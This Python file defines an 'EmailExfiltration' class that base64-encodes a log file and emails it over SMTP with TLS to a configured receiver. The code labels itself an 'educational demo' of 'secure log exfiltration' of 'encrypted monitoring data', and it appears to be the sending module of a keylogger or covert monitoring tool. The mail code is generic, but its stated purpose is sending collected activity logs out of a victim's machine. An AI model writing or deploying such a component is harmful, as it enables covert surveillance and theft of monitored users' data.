import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import ssl
import config

class EmailExfiltration:
    def __init__(self):
        
        self.smtp_server = config.SMTP_SERVER
        self.smtp_port = config.SMTP_PORT
        self.sender = config.SENDER_EMAIL
        self.password = config.SENDER_PASSWORD
        self.receiver = config.RECEIVER_EMAIL
    
    def send_log(self, file_path, subject="Activity Log - Educational Demo"):
        """
        Send encrypted log file via email (DEMO ONLY)
        
        NOTE: This requires email credentials to be set in environment variables:
        export SENDER_EMAIL="your_email@gmail.com"
        export SENDER_PASSWORD="your_app_password"
        export RECEIVER_EMAIL="receiver@email.com"
        """
        
        # Check if credentials are configured
        if not all([self.sender, self.password, self.receiver]):
            print("[!] Email credentials not configured")
            print("[i] Set environment variables: SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL")
            return False
        
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = self.sender
            msg['To'] = self.receiver
            msg['Subject'] = subject
            
            # Email body
            body = """
            Automated activity log attachment.
            
            This is a demonstration of secure log exfiltration for educational purposes only.
            
            WARNING: This email contains encrypted monitoring data.
            """
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach file
            with open(file_path, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={file_path.name}'
            )
            msg.attach(part)
            
            # Send email with TLS
            context = ssl.create_default_context()
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls(context=context)
                server.login(self.sender, self.password)
                server.send_message(msg)
            
            print(f"[*] Log sent via email to {self.receiver}")
            return True
            
        except Exception as e:
            print(f"[!] Email sending error: {e}")
            return False
